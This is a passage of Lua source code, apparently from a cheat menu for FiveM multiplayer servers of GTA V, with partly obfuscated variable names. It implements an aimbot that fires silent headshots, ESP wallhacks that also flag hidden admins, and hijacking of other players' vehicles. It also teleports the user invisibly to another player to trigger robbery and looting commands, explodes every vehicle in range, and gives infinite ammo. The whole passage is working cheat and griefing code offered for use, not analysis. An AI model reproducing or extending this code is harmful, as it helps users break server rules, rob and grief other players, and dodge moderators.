                        if (_x > 0.5 - ((F0v11 / 2) / 0.5) and _x < 0.5 + ((F0v11 / 2) / 0.5) and _y > 0.5 - ((F0v11 / 2) / 0.5) and _y < 0.5 + ((F0v11 / 2) / 0.5)) then
                            if not IsEntityVisible(p333dd) then



                            else
                                if IsAimCamActive() then
                                    if a1111l0ck30nlyv1s1bl3 then
                                        if HasEntityClearLosToEntity(PlayerPedId(), p333dd, 19) then
                                            SetGameplayCamRelativeRotation(roll, pitch, yaw)
                                        end
                                    else
                                        SetGameplayCamRelativeRotation(roll, pitch, yaw)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end



        if R44g3b00t then
            local F0v11 = (Sliders["circulo"].value / 200)

            local p333dd, a, b, c, d = getbixopuxePed()

            if b11xo00pux33P3ds then
                aped = p333dd
            else
                aped = IsPedAPlayer(p333dd)
            end

            if bixopuxeDeads then
                deads = p333dd
            else
                deads = not IsEntityDead(p333dd)
            end

            if A11mf03v_at74par3d3 then
                vis = logged2
            else
                vis = HasEntityClearLosToEntity(PlayerPedId(), p333dd, 17)
            end

            local hit = math.random(0, 100)

            local x, y, z = table.unpack(GetPedBoneCoords(p333dd, 31086))

            local _, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)

            local c = GetPedBoneCoords(p333dd, 31086)

            local x1, y1, z1 = table.unpack(c)

            local selfpos, rot = GetFinalRenderedCamCoord(), GetEntityRotation(PlayerPedId(), 2)

            local angleX, angleY, angleZ = (c - selfpos).x, (c - selfpos).y, (c - selfpos).z

            local roll, pitch, yaw = -math.deg(math.atan2(angleX, angleY)) - rot.z,
                math.deg(math.atan2(angleZ, #vector3(angleX, angleY, 0.0))), 1.0

            local d1stanc3 = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), x1, y1, z1, true)

            local am1g02 = false

            roll = 0.0 + (roll - 0.0)





            if am1g02 == false then
                if p333dd ~= PlayerPedId() and IsEntityOnScreen(p333dd) then
                    if (_x > 0.5 - ((F0v11 / 2) / 0.5) and _x < 0.5 + ((F0v11 / 2) / 0.5) and _y > 0.5 - ((F0v11 / 2) / 0.5) and _y < 0.5 + ((F0v11 / 2) / 0.5)) then
                        if n30pux37c0rno and not IsEntityVisible(p333dd) then

                        else
                            if IsControlPressed(1, R9g3b0tK3i["Value"]) then
                                if d1stanc3 < 500 and d1stanc3 > 5 then
                                    if IsEntityDead(p333dd) == false then
                                        Citizen.CreateThread(function()
                                            local pl2y3rP3d = PlayerPedId()

                                            local pl3ay3rC00rds = GetEntityCoords(pl2y3rP3d)

                                            local ta7g3tp3d = p333dd

                                            if not DoesEntityExist(ta7g3tp3d) then
                                                return
                                            end

                                            local t47g3tc00rds = GetEntityCoords(ta7g3tp3d)

                                            local c = GetPedBoneCoords(p333dd, 31086)

                                            local bu113tsp31d = 500

                                            local x1, y1, z1 = table.unpack(c)



                                            SetPedShootsAtCoord(pl2y3rP3d, x1 + 0.2, y1 + 0.2, z1 + 0.2, true)



                                            local ta7g3tH3adC000rdsd = GetPedBoneCoords(ta7g3tp3d, ta7g3tH3adB00n33)

                                            Wait(100)

                                            ShootSingleBulletBetweenCoords(x1 + 0.2, y1 + 0.2, z1 + 0.2, x1, y1, z1,
                                                bu113tsp31d, true, GetHashKey("WEAPON_PISTOL_MK2"), pl2y3rP3d, true,
                                                false, -1.0, true)
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end





        Citizen.CreateThread(function()
            while ControleRemoto do
                FreezeEntityPosition(PlayerPedId(), true)

                SetVehicleEngineOn(SelectedVeh, true, true, true)

                Wait(0)

                if ControleRemoto then
                    local spectate_cam = spectate_cam

                    if not spectate_cam ~= nil then
                        spectate_cam = CreateCam('DEFAULT_SCRIPTED_Camera', 1)
                    end

                    RenderScriptCams(1, 0, 0, 1, 1)

                    SetCamActive(spectate_cam, true)

                    local coords = GetEntityCoords(SelectedVeh)



                    --print('SelectedVeh: ' ..coords)

                    SetCamCoord(spectate_cam, coords.x, coords.y, coords.z + 3)

                    local offsetRotX = 0.0

                    local offsetRotY = 0.0

                    local offsetRotZ = 0.0

                    local weapondelay = 0

                    while DoesCamExist(spectate_cam) do
                        Wait(0)

                        if not ControleRemoto then
                            DestroyCam(spectate_cam, false)

                            ClearTimecycleModifier()

                            RenderScriptCams(false, false, 0, 1, 0)

                            SetFocusEntity(PlayerPedId())

                            FreezeEntityPosition(PlayerPedId(), false)

                            break
                        end

                        local playerPed = GetPlayerPed(SelectedPlayer)

                        local playerRot = GetEntityRotation(playerPed, 2)

                        local rotX = playerRot.x

                        local rotY = playerRot.y

                        local rotZ = playerRot.z

                        offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * 8.0)

                        offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * 8.0)

                        if (offsetRotX > 90.0) then
                            offsetRotX = 90.0
                        elseif (offsetRotX < -90.0) then
                            offsetRotX = -90.0
                        end

                        if (offsetRotY > 90.0) then
                            offsetRotY = 90.0
                        elseif (offsetRotY < -90.0) then
                            offsetRotY = -90.0
                        end

                        if (offsetRotZ > 360.0) then
                            offsetRotZ = offsetRotZ - 360.0
                        elseif (offsetRotZ < -360.0) then
                            offsetRotZ = offsetRotZ + 360.0
                        end



                        if IsDisabledControlPressed(0, 129) and not IsDisabledControlPressed(0, 130) then
                            TaskVehicleTempAction(PlayerPedId(), SelectedVeh, 9, 1)
                        end

                        if IsDisabledControlJustReleased(0, 129) or IsDisabledControlJustReleased(0, 130) then
                            TaskVehicleTempAction(PlayerPedId(), SelectedVeh, 6, 2500)
                        end

                        if IsDisabledControlPressed(0, 130) and not IsDisabledControlPressed(0, 129) then
                            TaskVehicleTempAction(PlayerPedId(), SelectedVeh, 22, 1)
                        end

                        if IsDisabledControlPressed(0, 89) and IsDisabledControlPressed(0, 130) then
                            TaskVehicleTempAction(PlayerPedId(), SelectedVeh, 13, 1)
                        end

                        if IsDisabledControlPressed(0, 90) and IsDisabledControlPressed(0, 130) then
                            TaskVehicleTempAction(PlayerPedId(), SelectedVeh, 14, 1)
                        end

                        if IsDisabledControlPressed(0, 129) and IsDisabledControlPressed(0, 130) then
                            TaskVehicleTempAction(PlayerPedId(), SelectedVeh, 30, 100)
                        end

                        if IsDisabledControlPressed(0, 89) and IsDisabledControlPressed(0, 129) then
                            TaskVehicleTempAction(PlayerPedId(), SelectedVeh, 7, 1)
                        end

                        if IsDisabledControlPressed(0, 90) and IsDisabledControlPressed(0, 129) then
                            TaskVehicleTempAction(PlayerPedId(), SelectedVeh, 8, 1)
                        end

                        if IsDisabledControlPressed(0, 89) and not IsDisabledControlPressed(0, 129) and not IsDisabledControlPressed(0, 130) then
                            TaskVehicleTempAction(PlayerPedId(), SelectedVeh, 4, 1)
                        end

                        if IsDisabledControlPressed(0, 90) and not IsDisabledControlPressed(0, 129) and not IsDisabledControlPressed(0, 130) then
                            TaskVehicleTempAction(PlayerPedId(), SelectedVeh, 5, 1)
                        end





                        local x, y, z = table.unpack(GetCamCoord(spectate_cam))

                        local coords_ES = GetEntityCoords(SelectedVeh) +
                            (RotationToDirection(GetCamRot(spectate_cam, 2)) * (0.5 * 1.5))

                        SetCamCoord(spectate_cam, coords_ES.x - 3.0, coords_ES.y, coords_ES.z + 2.0)

                        if not Displayed then
                            SetFocusArea(GetCamCoord(spectate_cam).x, GetCamCoord(spectate_cam).y,
                                GetCamCoord(spectate_cam).z, 0.0, 0.0, 0.0)

                            SetCamRot(spectate_cam, offsetRotX, offsetRotY, offsetRotZ, 2)
                        end
                    end
                end
            end
        end)



        function RaaGddBee22(frequency)
            local result = {}

            local curtime = GetGameTimer() / 1000



            result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)

            result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)

            result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)



            return result
        end

        function RGBRainbow(frequency)
            local result = {}

            local curtime = GetGameTimer() / 1000



            result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)

            result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)

            result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)



            return result
        end

        if esp_linhas then
            if 1 == 1 then --if e3sp3s then
                for an in EnumeratePeds() do
                    local cC = GetEntityCoords(an)

                    local c00rds = GetEntityCoords(PlayerPedId())

                    local me = an ~= PlayerPedId()

                    local mr = IsPedAPlayer(aR)

                    local cD = GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), cC.x, cC.y, cC.z, true) *
                        (1.6 - 0.05)   -- Tamanho

                    local dismax = 400 --Sll1d3rs["par3d3_d1st"].valu333 * 3

                    if IsEntityOnScreen(an) then
                        if cD < dismax then
                            if me then
                                if HasEntityClearLosToEntity(PlayerPedId(), an, 19) then
                                    DrawLine(c00rds, cC, 255, 16, 150, 232)
                                else
                                    if false == false then
                                        DrawLine(c00rds, cC, 255, 16, 150, 232)
                                    end
                                end
                            end
                        end

                        ClearDrawOrigin()
                    end
                end
            end
        end



        if l1n23sc0rn0 then
            for an in EnumeratePeds() do
                local adm = IsEntityVisible(an)

                for _, admin in ipairs(C0rn0s) do
                    if admin == an then
                        local admnistrador = true
                    end
                end

                if adm == false or admnistrador then
                    local cC = GetEntityCoords(an)

                    local c00rds = GetEntityCoords(PlayerPedId())

                    local me = an ~= PlayerPedId()

                    local mr = IsPedAPlayer(aR)

                    local cD = GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), cC.x, cC.y, cC.z, true) *
                        (1.6 - 0.05) -- Tamanho

                    local dismax = 160

                    if cD < dismax and GozaDentroFalcon == false then
                        if me then
                            ra = RaaGddBee22(2.0)

                            DrawLine(c00rds, cC, ra.r, ra.g, ra.b, 255)

                            for _, admin in ipairs(C0rn0s) do
                                if admin == an then
                                    jaeadm = true
                                end
                            end

                            if jaeadm ~= true then
                                table.insert(C0rn0s, an)
                            end
                        end
                    end

                    ClearDrawOrigin()
                end
            end
        end



        if espesq then
            local visualsskeletons_peds = true

            for ped in EnumeratePeds() do
                local d = GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), GetEntityCoords(ped), false)

                if visualsskeletons_peds then
                    mr = ped
                else
                    mr = IsPedAPlayer(ped)
                end

                if visuals_skeletons_self then
                    me = ped
                else
                    me = ped ~= PlayerPedId()
                end

                dead = IsEntityDead(ped)



                if d < 999 then --Sliders['esp_distancia'].value + 0.0 then
                    if mr and not dead and IsEntityOnScreen(ped) then
                        if ped ~= PlayerPedId() then
                            if HasEntityClearLosToEntity(PlayerPedId(), ped, 19) then
                                local r, g, b = dasihbudsauihdsahuidsuh2.r, dasihbudsauihdsahuidsuh2.g,
                                    dasihbudsauihdsahuidsuh2.b

                                DrawLine(GetPedBoneCoordsF(ped, 31086, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x5C57, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x192A, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x3FCF, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x192A, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0xCC4D, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x3FCF, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0xB3FE, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x5C57, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0xB3FE, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x3779, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xB1C5, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0xB1C5, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xEEEB, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0xEEEB, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x49D9, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x9D4D, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x9D4D, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x6E5C, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x6E5C, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xDEAD, 0.0, 0.0, 0.0), r, g, b, 255)
                            else
                                local r, g, b = dasihbudsauihdsahuidsuh2.r, dasihbudsauihdsahuidsuh2.g,
                                    dasihbudsauihdsahuidsuh2.b

                                DrawLine(GetPedBoneCoordsF(ped, 31086, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x5C57, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x192A, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x3FCF, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x192A, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0xCC4D, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x3FCF, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0xB3FE, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x5C57, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0xB3FE, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x3779, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xB1C5, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0xB1C5, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xEEEB, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0xEEEB, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x49D9, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x9D4D, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x9D4D, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0x6E5C, 0.0, 0.0, 0.0), r, g, b, 255)

                                DrawLine(GetPedBoneCoordsF(ped, 0x6E5C, 0.0, 0.0, 0.0),
                                    GetPedBoneCoordsF(ped, 0xDEAD, 0.0, 0.0, 0.0), r, g, b, 255)
                            end
                        end
                    end
                end
            end
        end



        if l1n23sc0rn02 then
            local maxDistance = 500

            local myPlayerId = PlayerId()

            local myPos = GetEntityCoords(PlayerPedId())



            for _, player in ipairs(GetActivePlayers()) do
                if player ~= myPlayerId then
                    local myped = GetPlayerPed(player)

                    if myped ~= -1 and myped ~= nil then
                        local playerPos = GetEntityCoords(myped)

                        local distance = #(myPos - playerPos)



                        if IsEntityVisibleToScript(myped) == false and distance <= maxDistance then
                            if distance < maxDistance then
                                if true and not IsEntityDead(myped) then
                                    if HasEntityClearLosToEntity(PlayerPedId(), myped, 19) and IsEntityOnScreen(myped) then
                                        local ra = RaaGddBee22(2.0)



                                        DrawLine(GetPedBoneCoords(myped, 31086), GetPedBoneCoords(myped, 0x9995), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x9995), GetEntityCoords(myped), ra.r, ra.g,
                                            ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x5C57), GetEntityCoords(myped), ra.r, ra.g,
                                            ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x192A), GetEntityCoords(myped), ra.r, ra.g,
                                            ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x3FCF), GetPedBoneCoords(myped, 0x192A), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0xCC4D), GetPedBoneCoords(myped, 0x3FCF), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0xB3FE), GetPedBoneCoords(myped, 0x5C57), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0xB3FE), GetPedBoneCoords(myped, 0x3779), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x9995), GetPedBoneCoords(myped, 0xB1C5), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0xB1C5), GetPedBoneCoords(myped, 0xEEEB), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0xEEEB), GetPedBoneCoords(myped, 0x49D9), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x9995), GetPedBoneCoords(myped, 0x9D4D), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x9D4D), GetPedBoneCoords(myped, 0x6E5C), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x6E5C), GetPedBoneCoords(myped, 0xDEAD), ra.r,
                                            ra.g, ra.b, 255)



                                        local myPos = GetPedBoneCoords(myped, 31086)

                                        DrawMarker(28, myPos.x, myPos.y, myPos.z + 0.06, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0,
                                            0.1, 0.1, 0.1, ra.r, ra.g, ra.b, 255, Stan_false, Stan_true, 2, kakamenuv3ss,
                                            kakamenuv3ss, Stan_false)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end





        function DrawTextOutline(Stan_text, x, y, scale, font, outline, center, r, g, b)
            SetTextScale(0.0, scale)

            SetTextFont(1)

            if outline then
                SetTextOutline(outline)
            else
            end

            SetTextCentre(center)

            --SetTextColour(iajdsasdjaoidjaiodj30.r, iajdsasdjaoidjaiodj30.g, iajdsasdjaoidjaiodj30.b, 255)

            SetTextFont(1)

            BeginTextCommandDisplayText('TWOSTRINGS')

            AddTextComponentString(Stan_text)

            EndTextCommandDisplayText(x, y - 0.011)
        end

        function DrawText3DD(x, y, z, text, r, g, b)
            SetDrawOrigin(x, y, z, 0)

            SetTextFont(0)

            SetTextProportional(0)

            SetTextScale(0.0, 0.20)

            SetTextColour(r, g, b, 255)

            SetTextDropshadow(0, 0, 0, 0, 255)

            SetTextEdge(2, 0, 0, 0, 150)

            SetTextDropShadow()

            SetTextOutline()

            SetTextEntry("STRING")

            SetTextCentre(1)

            AddTextComponentString(text)

            EndTextCommandDisplayText(0.0, 0.0)

            ClearDrawOrigin()
        end

        function GetPedBoneCoordsF(ped, boneId)
            local cam = GetFinalRenderedCamCoord()

            local ret, coords, shape = GetShapeTestResult(

                StartShapeTestRay(

                    vector3(cam), vector3(GetPedBoneCoords(ped, 0x0)), -1

                )

            )

            if coords then
                a = Vdist(cam, shape) / Vdist(cam, GetPedBoneCoords(ped, 0x0))
            else
                a = 0.83
            end

            if a > 1 then
                a = 0.83
            end

            if ret then
                return (((GetPedBoneCoords(ped, boneId) - cam) * ((a) * 0.83)) + cam)
            end
        end

        NetworkRequestEntityControl = function(Entity)
            if not NetworkIsInSession() or NetworkHasControlOfEntity(Entity) then
                return true
            end

            SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(Entity), true)

            return NetworkRequestControlOfEntity(Entity)
        end


        function RGBcarrito(frequency)
            local result = {}

            local curtime = GetGameTimer() / 1000

            result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)

            result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)

            result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

            return result
        end

        function revistarplayer() --saquear/revistar
            LocalPlayer.state["Policia"] = true
            if SelectedPlayer then
                local oldCoords = GetEntityCoords(PlayerPedId())



                local playerCoords = GetEntityCoords(GetPlayerPed(SelectedPlayer))



                SetEntityVisible(PlayerPedId(), false)

                SetEntityCoordsNoOffset(PlayerPedId(), playerCoords)



                SetTimeout(1000, function()
                    ExecuteCommand("saquear")

                    ExecuteCommand("roubar")

                    ExecuteCommand("lotear")

                    ExecuteCommand("revistar")



                    SetTimeout(1000, function()
                        SetEntityCoordsNoOffset(PlayerPedId(), oldCoords)

                        SetEntityVisible(PlayerPedId(), true)
                    end)
                end)
            end
        end

        SetPedDefaultComponentVariationFun = function()
            Citizen.InvokeNative(0xCD8A7537A9B52F06, Citizen.InvokeNative(0x43A66C31C68491C0, -1))

            Citizen.InvokeNative(0x0E5173C163976E38, Citizen.InvokeNative(0x43A66C31C68491C0, -1))

            Citizen.InvokeNative(0x262B14F48D29DE80, Citizen.InvokeNative(0x43A66C31C68491C0, -1), 1, 0, 0, 0)

            Citizen.InvokeNative(0x262B14F48D29DE80, Citizen.InvokeNative(0x43A66C31C68491C0, -1), 5, 0, 0, 0)

            Citizen.InvokeNative(0x262B14F48D29DE80, Citizen.InvokeNative(0x43A66C31C68491C0, -1), 9, 0, 0, 0)
        end



        roupatutu = function()
            SetPedDefaultComponentVariationFun()

            --SetPedComponentVariation(PlayerPedId(), 1, 169, 14, 0) -- Msascara

            --SetPedPropIndex(PlayerPedId(), 0, 131, 2, 0) -- Chapeu

            SetPedComponentVariation(PlayerPedId(), 8, 15, 0, 0)  -- Camisa

            SetPedComponentVariation(PlayerPedId(), 11, 93, 1, 0) -- Jaqueta

            SetPedComponentVariation(PlayerPedId(), 4, 18, 2, 0)  -- Calca

            SetPedComponentVariation(PlayerPedId(), 6, 5, 0, 0)   -- Tenis
        end



        roupalegit0 = function()
            SetPedDefaultComponentVariationFun()

            SetPedComponentVariation(PlayerPedId(), 1, 169, 13, 1) -- Msascara

            SetPedPropIndex(PlayerPedId(), 0, 8, 0, 0)             -- Chapeu

            SetPedComponentVariation(PlayerPedId(), 8, 15, 0, 0)   -- Camisa

            SetPedComponentVariation(PlayerPedId(), 11, 5, 3, 0)   -- Jaqueta

            SetPedComponentVariation(PlayerPedId(), 4, 6, 1, 0)    -- Calca

            SetPedComponentVariation(PlayerPedId(), 6, 1, 1, 0)    -- Tenis
        end



        roupalegit1 = function()
            SetPedDefaultComponentVariationFun()

            SetPedComponentVariation(PlayerPedId(), 1, 169, 14, 1) -- Msascara

            SetPedPropIndex(PlayerPedId(), 0, 131, 3, 0)           -- Chapeu

            SetPedComponentVariation(PlayerPedId(), 8, 15, 0, 0)   -- Camisa

            SetPedComponentVariation(PlayerPedId(), 11, 200, 2, 0) -- Jaqueta

            SetPedComponentVariation(PlayerPedId(), 4, 6, 1, 0)    -- Calca

            SetPedComponentVariation(PlayerPedId(), 6, 1, 0, 0)    -- Tenis
        end



        roupalegit2 = function()
            SetPedDefaultComponentVariationFun()

            SetPedComponentVariation(PlayerPedId(), 1, 0, 0, 0)     -- Msascara

            SetPedPropIndex(PlayerPedId(), 0, 131, 3, 0)            -- Chapeu

            SetPedComponentVariation(PlayerPedId(), 8, 15, 0, 0)    -- Camisa

            SetPedComponentVariation(PlayerPedId(), 11, 200, 21, 0) -- Jaqueta

            SetPedComponentVariation(PlayerPedId(), 4, 16, 3, 0)    -- Calca

            SetPedComponentVariation(PlayerPedId(), 6, 1, 3, 0)     -- Tenis
        end

        roupaADM = function()
            SetPedDefaultComponentVariationFun()

            SetPedComponentVariation(PlayerPedId(), 1, 20, 0, 0)  -- Msascara

            SetPedPropIndex(PlayerPedId(), 0, 11, 3, 0)           -- Chapeu

            SetPedComponentVariation(PlayerPedId(), 8, 15, 0, 0)  -- Camisa

            SetPedComponentVariation(PlayerPedId(), 11, 50, 0, 0) -- Jaqueta

            SetPedComponentVariation(PlayerPedId(), 4, 55, 0, 0)  -- Calca

            SetPedComponentVariation(PlayerPedId(), 6, 17, 3, 0)  -- Tenis
        end


        function SetCurrentAmmo(ammo)
            local weaponnow = GetSelectedPedWeapon(PlayerPedId())

            SetPedAmmo(PlayerPedId(), weaponnow, 250)
        end

        if muniinfinita then
            SetPedInfiniteAmmoClip(PlayerPedId(), true)
        else
            SetPedInfiniteAmmoClip(PlayerPedId(), false)
        end



        if cordaarmita then

        end



        if noReload then
            PedSkipNextReloading(PlayerPedId())
        end



        if Pul4rc4r then
            SetPedCanRagdoll(PlayerPedId(), false)

            if IsDisabledControlJustPressed(0, 22) then
                local vehiz = GetVehiclePedIsIn(PlayerPedId(), 0)

                NetworkRequestEntityControl(vehiz)

                ApplyForceToEntity(vehiz, 1, 0.0, 0.0, 15.0, 0.0, 0.0, 00.0, 0, 1, 0, 1, 0, 0)

                --ApplyForceToEntity(PlayerPedId(), 3, 0.0, 0.0, Sliders['s4populo'].value, 0.0, 0.0, 0.0, 0, 0, 0, 1, 1, 1)
            end
        end



        -- Obtendo as coordenadas do jogador

        function GetPlayerCoords()
            local playerPed = GetPlayerPed(SelectedPlayer)

            return GetEntityCoords(playerPed)
        end

        blockveh = function(vehicle, ped)
            if ped then
                if IsPedInAnyVehicle(ped, 0) then
                    SetVehicleDoorsLockedForAllPlayers(vehicle, true)

                    SetVehicleDoorsLockedForPlayer(vehicle, PlayerPedId(), true)

                    SetVehicleDoorsLocked(vehicle, true)

                    NetworkRequestEntityControl(vehicle)

                    ClearPedTasksImmediately(vehicle)

                    ClearPedSecondaryTask(vehicle)

                    ClearPedTasks(vehicle)

                    FreezeEntityPosition(vehicle, 1)

                    SetVehicleNumberPlateText(vehicle, 'FARINHAMENU')

                    NetworkRequestEntityControl(vehicle)

                    FreezeEntityPosition(vehicle, true)

                    FreezeEntityPosition(vehicle, false)

                    SetVehicleBurnout(vehicle, true)
                end
            else
                print('NOT WORK BCZ HAVE A PLAYER IN VEHICLE')
            end
        end



        function prepararindexar()
            Citizen.CreateThread(function()
                local antes = GetEntityCoords(PlayerPedId())

                for vehicle in EnumerateVehicles() do
                    NetworkRequestControlOfEntity(vehicle)

                    SetPedIntoVehicle(PlayerPedId(), vehicle, -1)

                    Citizen.Wait(0)
                end

                SetEntityCoords(PlayerPedId(), antes)
            end)
        end

        function TutuuuFly()
            for vehicle in EnumerateVehicles() do
                RequestControlOnce(vehicle)

                local vehiclePos = GetEntityCoords(vehicle)

                SetEntityCoordsNoOffset(vehicle, vehiclePos.x, vehiclePos.y, vehiclePos.z + 5.0, true, true, true)
            end

            local startTime = GetGameTimer()

            while GetGameTimer() - startTime < 2000 do
                Wait(0)
            end

            for vehicle in EnumerateVehicles() do
                if DoesEntityExist(vehicle) and not IsEntityDead(vehicle) then
                    local vehiclePos = GetEntityCoords(vehicle)

                    AddExplosion(vehiclePos.x, vehiclePos.y, vehiclePos.z, 44, 1000.0, true, true, 1.0)
                end
            end
        end

        function tutu_MudarPlacaMQCU()
            local placa = "ChupoSaco"

            for playerVeh in EnumerateVehicles() do
                if (not IsPedAPlayer(GetPedInVehicleSeat(playerVeh, -1))) then
                    NetworkRequestEntityControl(playerVeh)

                    SetVehicleNumberPlateText(playerVeh, placa)
                end
            end
        end

        FreeCamKeys = function()
            DisableControlAction(1, 36, true)

            DisableControlAction(1, 37, true)

            DisableControlAction(1, 38, true)

            DisableControlAction(1, 44, true)

            DisableControlAction(1, 45, true)

            DisableControlAction(1, 69, true)

            DisableControlAction(1, 70, true)

            DisableControlAction(0, 63, true)

            DisableControlAction(0, 64, true)

            DisableControlAction(0, 278, true)

            DisableControlAction(0, 279, true)

            DisableControlAction(0, 280, true)

            DisableControlAction(0, 281, true)

            DisableControlAction(0, 91, true)

            DisableControlAction(0, 92, true)

            DisablePlayerFiring(PlayerId(), true)

            DisableControlAction(0, 24, true)

            DisableControlAction(0, 25, true)

            DisableControlAction(1, 37, true)

            DisableControlAction(0, 47, true)

            DisableControlAction(0, 58, true)

            DisableControlAction(0, 140, true)

            DisableControlAction(0, 141, true)

            DisableControlAction(0, 81, true)

            DisableControlAction(0, 82, true)

            DisableControlAction(0, 83, true)

            DisableControlAction(0, 84, true)

            DisableControlAction(0, 12, true)

            DisableControlAction(0, 13, true)

